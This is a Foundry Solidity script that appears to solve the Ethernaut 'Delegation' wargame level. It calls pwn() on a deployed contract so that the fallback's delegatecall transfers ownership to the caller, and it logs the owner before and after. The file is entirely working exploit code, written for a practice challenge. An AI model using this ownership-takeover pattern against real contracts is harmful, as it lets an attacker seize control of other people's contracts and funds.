// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract DelegationSolution is Script {

    Delegation public delegationInstance = Delegation(0x188f262084173831aDE1Fa02256C80D857f00381);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before: ", delegationInstance.owner());
        address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
        console.log("Owner after: ", delegationInstance.owner());
        console.log("My Address: ",vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}
